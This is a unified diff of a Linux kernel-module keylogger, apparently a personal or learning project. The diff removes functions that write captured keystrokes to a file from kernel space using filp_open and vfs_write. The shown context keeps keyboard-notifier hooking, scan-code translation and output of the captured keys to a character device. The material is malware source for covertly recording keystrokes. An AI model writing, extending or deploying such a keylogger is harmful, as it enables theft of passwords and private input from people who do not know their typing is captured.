@@ -69,8 +69,6 @@
 //////////////
 typedef struct _myKeyLogger
 {
-    struct file *log_fp;
-    loff_t logOffset;
     unsigned char keyStr[BUFF_SIZE + 1];
 } myKeyLogger, *myKeyLogger_ptr;
 
@@ -92,13 +90,6 @@ typedef struct _myLogDevice
 static int __init key_logger_init(void);
 // PURPOSE - LKM exit function
 static void __exit key_logger_exit(void);
-// PURPOSE - Return a file pointer to fileName_ptr with given flags and permissions
-static struct file* open_log(const char *fileName_ptr, int flags, int rights);
-// PURPOSE - Close a file pointer
-static void close_log(struct file *logFile_fp);
-// PURPOSE - Write data to an open file*
-// RETURN - Number of bytes written on success, -1 on failure
-static int write_log(struct file *logFile_fp, unsigned char *data, unsigned int size, unsigned long long offset);
 // PURPOSE - Translate scan code to 'key' string
 // RETURN - 1 for unsupported value, 0 on success, -1 on failure
 static int translate_code(unsigned char scanCode, char *buf);
@@ -160,16 +151,12 @@ static int __init key_logger_init(void)
 {
     int retVal = 0;
     // unsigned char i = 0;  // DEBUGGING
-    int tempRetVal = 0;  // write_log() return value
-    int msgLen = strlen(DEF_LOG_INIT_MSG);  // Length of init message
     struct device *device = NULL;  // device_create() return value
     
     HARKLE_KINFO(DEVICE_NAME, "Key logger loading");  // DEBUGGING
 
     // Initialize Globals
     // 1. Initialize myKeyLogger struct
-    myKL.log_fp = NULL;
-    myKL.logOffset = 0;
     memset(myKL.keyStr, 0x0, BUFF_SIZE * sizeof(char));
     // 2. shift
     shift = FALSE;
@@ -179,40 +166,6 @@ static int __init key_logger_init(void)
     // {
     //     translate_code(i, myKL.keyStr);
     // }
-
-    // Prepare Key Logging File
-    myKL.log_fp = open_log(DEF_LOG_FILENAME, DEF_LOG_FLAGS, DEF_LOG_PERMS);
-
-    if (!(myKL.log_fp))
-    {
-        retVal = -1;
-        HARKLE_KERROR(DEVICE_NAME, key_logger_init, "open_log() failed");  // DEBUGGING
-    }
-    else
-    {
-        HARKLE_KINFO(DEVICE_NAME, "File opened");  // DEBUGGING
-
-        // NOTE: Getting errors here.  Work on making the logger append to the file later.
-        // http://www.ouah.org/mammon_kernel-mode_read_hack.txt
-        // myKL.logOffset = myKL.log_fp->f_pos;
-        // printk(KERN_INFO "%s: File offset of %s is %ld\n", DEVICE_NAME, DEF_LOG_FILENAME, myKL.logOffset);  // DEBUGGING
-
-        tempRetVal = write_log(myKL.log_fp, DEF_LOG_INIT_MSG, msgLen, myKL.logOffset);
-
-        if (tempRetVal == strlen(DEF_LOG_INIT_MSG))
-        {
-            myKL.logOffset += msgLen;
-        }
-        else if (tempRetVal > 0)
-        {
-            myKL.logOffset += tempRetVal;
-        }
-        else
-        {
-            retVal = -1;
-            HARKLE_KERROR(DEVICE_NAME, key_logger_init, "write_log() failed");  // DEBUGGING
-        }
-    }
 
     if (!retVal)
     {
@@ -344,9 +297,6 @@ static int __init key_logger_init(void)
 
 static void __exit key_logger_exit(void)
 {
-    int tempRetVal = 0;  // write_log() return value
-    int msgLen = strlen(DEF_LOG_CLOSE_MSG);
-
     HARKLE_KINFO(DEVICE_NAME, "Key logger unloading");  // DEBUGGING
 
 #if SOLUTION == 1
@@ -360,35 +310,6 @@ static void __exit key_logger_exit(void)
     unregister_keyboard_notifier(&kl_notif_block);
 #endif  // SOLUTION
 
-    // Close Key Logging File
-    if (myKL.log_fp)
-    {
-        // Log final entry
-        tempRetVal = write_log(myKL.log_fp, DEF_LOG_CLOSE_MSG, msgLen, myKL.logOffset);
-
-        if (tempRetVal == strlen(DEF_LOG_CLOSE_MSG))
-        {
-            myKL.logOffset += msgLen;
-        }
-        else if (tempRetVal > 0)
-        {
-            myKL.logOffset += tempRetVal;
-        }
-        else
-        {
-            HARKLE_KERROR(DEVICE_NAME, key_logger_exit, "write_log() failed");  // DEBUGGING
-        }
-
-        // Close file
-        close_log(myKL.log_fp);
-        myKL.log_fp = NULL;
-        HARKLE_KINFO(DEVICE_NAME, "File closed");  // DEBUGGING
-    }
-    else
-    {
-        HARKLE_KWARNG(DEVICE_NAME, key_logger_exit, "Logging file pointer was NULL");  // DEBUGGING
-    }
-    
     // Teardown the character device
     HARKLE_KFINFO(CHRDEV_NAME, key_logger_exit, "Destroying device");  // DEBUGGING
     // device_destroy(class, MKDEV(cfake_major, minor));
@@ -409,105 +330,6 @@ static void __exit key_logger_exit(void)
     // DONE
     HARKLE_KINFO(DEVICE_NAME, "Key logger unloaded");  // DEBUGGING
     return;
-}
-
-static struct file* open_log(const char *fileName_ptr, int flags, int rights)
-{
-    struct file *retVal = NULL;
-    mm_segment_t old_fs = get_fs();  // Store the original process address space specification
-
-    // INPUT VALIDATION
-    if (!fileName_ptr)
-    {
-        HARKLE_KERROR(DEVICE_NAME, open_log, "NULL Pointer");  // DEBUGGING
-    }
-    else if (!(*fileName_ptr))
-    {
-        HARKLE_KERROR(DEVICE_NAME, open_log, "Empty string");  // DEBUGGING
-    }
-    else if (O_RDONLY != flags && !(flags & (O_WRONLY | O_RDWR)))
-    {
-        HARKLE_KERROR(DEVICE_NAME, open_log, "Invalid flags");  // DEBUGGING
-    }
-    else if (!rights)
-    {
-        HARKLE_KERROR(DEVICE_NAME, open_log, "Invalid permissions");  // DEBUGGING
-    }
-    else
-    {
-        // OPEN FILE
-        // 1. Change to kernel process address space
-        // set_fs(KERNEL_DS);  // I've seen this but...
-        set_fs(get_ds());  // ...the majority wins
-
-        // 2. Open the file
-        retVal = filp_open(fileName_ptr, flags, rights);
-
-        // 3. Restore the address specification (regardless of success)
-        set_fs(old_fs);
-
-        if (IS_ERR(retVal))
-        {
-            HARKLE_KERRNO(DEVICE_NAME, open_log, (int)PTR_ERR(retVal));
-            retVal = NULL;
-        }
-    }
-
-    return retVal;
-}
-
-static void close_log(struct file *logFile_fp)
-{
-    if (logFile_fp)
-    {
-        filp_close(logFile_fp, NULL);
-    }
-
-    return;
-}
-
-static int write_log(struct file *logFile_fp, unsigned char *data, unsigned int size, unsigned long long offset)
-{
-    int retVal = 0;
-    mm_segment_t oldfs = get_fs();;
-
-    if (!logFile_fp || !data)
-    {
-        HARKLE_KERROR(DEVICE_NAME, write_log, "NULL Pointer");  // DEBUGGING
-        // printk(KERN_DEBUG "%s: Data was %s\n", DEVICE_NAME, data);  // DEBUGGING
-        retVal = -1;
-    }
-    else if (!(*data) || !size)
-    {
-        HARKLE_KERROR(DEVICE_NAME, write_log, "Empty string");  // DEBUGGING
-        // printk(KERN_DEBUG "data == %s\n", data);  // DEBUGGING
-        // printk(KERN_DEBUG "size == %u\n", size);  // DEBUGGING
-        retVal = -1;
-    }
-    else
-    {
-        // set_fs(KERNEL_DS);  // I've seen this but...
-        set_fs(get_ds());  // ...the majority wins
-
-        retVal = vfs_write(logFile_fp, data, size, &offset);
-
-        if (retVal != size)
-        {
-            HARKLE_KWARNG(DEVICE_NAME, write_log, "vfs_write() return value did not match data size");
-        }
-        else if (retVal > 0)
-        {
-            // printk(KERN_INFO "%s: vfs_write wrote %d bytes\n", DEVICE_NAME, retVal);
-        }
-        else
-        {
-            HARKLE_KFINFO(DEVICE_NAME, write_log, "vfs_write() appears to have failed");
-        }
-
-        set_fs(oldfs);
-    }
-
-    return retVal;
 }
 
 /*
@@ -561,22 +383,7 @@ void tasklet_logger(unsigned long data)
     }
     else if (0 == tempRetVal)
     {
-        // 2. Write string to log file
-        // static int write_log(struct file *logFile_fp, unsigned char *data, unsigned int size, unsigned long long offset);
         msgLen = strlen(myKL.keyStr);
-        // printk(KERN_DEBUG "myKL.keyStr == %s\n", myKL.keyStr);  // DEBUGGING
-        // printk(KERN_DEBUG "strlen(myKL.keyStr) == %d\n", msgLen);  // DEBUGGING
-
-        // NOTES:
-        //  - msgLen > 0 avoids empty strings (due to unsupported values)
-        //  - myKL.log_fp (!= NULL) avoids the final (ENTER) in the queue that comes through after the _exit() is called
-        if (msgLen > 0 && myKL.log_fp)
-        {
-            if (msgLen != write_log(myKL.log_fp, myKL.keyStr, msgLen, myKL.logOffset))
-            {
-                HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_log() has failed");  // DEBUGGING
-            }
-        }
 
         // 2. Write the string to the character device
         if (msgLen > 0)
@@ -648,19 +455,7 @@ int kl_module(struct notifier_block *notifBlock, unsigned long code, void *_para
         }
         else if (0 == tempRetVal)
         {
-            // 2. Write string to log file
             msgLen = strlen(myKL.keyStr);
-
-            // NOTES:
-            //  - msgLen > 0 avoids empty strings (due to unsupported values)
-            //  - myKL.log_fp (!= NULL) avoids the final (ENTER) in the queue that comes through after the _exit() is called
-            if (msgLen > 0 && myKL.log_fp)
-            {
-                if (msgLen != write_log(myKL.log_fp, myKL.keyStr, msgLen, myKL.logOffset))
-                {
-                    HARKLE_KERROR(DEVICE_NAME, tasklet_logger, "write_log() has failed");  // DEBUGGING
-                }
-            }
 
             // 2. Write the string to the character device
             if (msgLen > 0)
